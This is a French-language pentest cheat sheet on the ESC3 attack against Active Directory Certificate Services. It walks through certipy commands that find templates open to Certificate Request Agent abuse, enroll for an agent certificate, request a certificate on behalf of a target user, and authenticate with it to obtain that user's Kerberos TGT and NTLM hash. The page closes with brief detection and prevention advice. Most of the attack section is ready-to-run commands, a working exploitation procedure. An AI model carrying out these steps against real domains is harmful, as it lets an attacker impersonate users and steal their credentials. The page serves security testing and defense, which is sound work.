# ESC3 - Certificate Request Agent Abuse

### <mark style="color:red;">ESC3 - Certificate Request Agent Abuse</mark>&#x20;

### <mark style="color:blue;">📋 Description</mark>

ESC3 exploite le mécanisme de **Certificate Request Agent** dans Active Directory Certificate Services (AD CS). Un utilisateur autorisé peut obtenir un certificat spécial qui lui permet de demander des certificats **au nom d'autres utilisateurs**.

#### <mark style="color:green;">🎯 Prérequis</mark>

* Accès à un compte membre du groupe ayant les droits d'enrollment sur un template avec `Certificate Request Agent` EKU
* Template vulnérable avec :
  * `Enrollment Agent : True`
  * `Extended Key Usage : Certificate Request Agent`
  * Enrollment Rights pour votre utilisateur

#### <mark style="color:green;">🔍 Détection</mark>

```bash
# Scanner les templates vulnérables
certipy find -u USER -p 'PASSWORD' -target DOMAIN -ns DC_IP -vulnerable -stdout

# Chercher dans les résultats :
# [!] Vulnerabilities
#   ESC3 : Template has Certificate Request Agent EKU set
```

#### <mark style="color:green;">⚔️ Exploitation</mark>

<mark style="color:orange;">**Étape 1 : Obtenir le certificat d'agent**</mark>

```bash
certipy req -u USER -p 'PASSWORD' \
  -target DOMAIN \
  -ca 'CA-NAME' \
  -template 'VULNERABLE-TEMPLATE'
  
# Résultat : USER.pfx (certificat d'agent)
```

<mark style="color:orange;">**Étape 2 : Identifier un template utilisable**</mark>

Rechercher un template qui :

* Permet l'enrollment par Domain Users
* Est activé
* Permet l'authentification client (`Client Authentication : True`)
* N'exige pas d'approbation manuelle

```bash
# Vérifier les templates disponibles
certipy find -u USER -p 'PASSWORD' -target DOMAIN -ns DC_IP
```

<mark style="color:orange;">**Étape 3 : Demander un certificat pour une cible**</mark>

```bash
certipy req -u USER -p 'PASSWORD' \
  -target DOMAIN \
  -ca 'CA-NAME' \
  -template 'VALID-TEMPLATE' \
  -on-behalf-of 'DOMAIN\TARGET-USER' \
  -pfx USER.pfx

# Résultat : TARGET-USER.pfx
```

**Étape 4 : S'authentifier avec le certificat volé**

```bash
certipy auth -pfx TARGET-USER.pfx -dc-ip DC_IP

# Outputs :
# - TGT Kerberos (TARGET-USER.ccache)
# - NTLM hash du compte cible
```

#### <mark style="color:green;">⚠️ Limitations</mark>

* Le template cible peut exiger une adresse email
* Certains comptes (comme Administrator par défaut) n'ont pas d'email configuré
* Solution : cibler des comptes utilisateurs avec emails configurés

#### <mark style="color:green;">🛡️ Détection/Prévention</mark>

* Auditer les templates avec `Certificate Request Agent` EKU
* Restreindre les enrollments rights sur ces templates
* Monitorer les événements 4886 et 4887 (demandes de certificats)
* Activer `Manager Approval` sur les templates sensibles

#### 📚 Références

* [Certipy ESC3 Documentation](https://github.com/ly4k/Certipy#esc3)
* [Certified Pre-Owned - SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
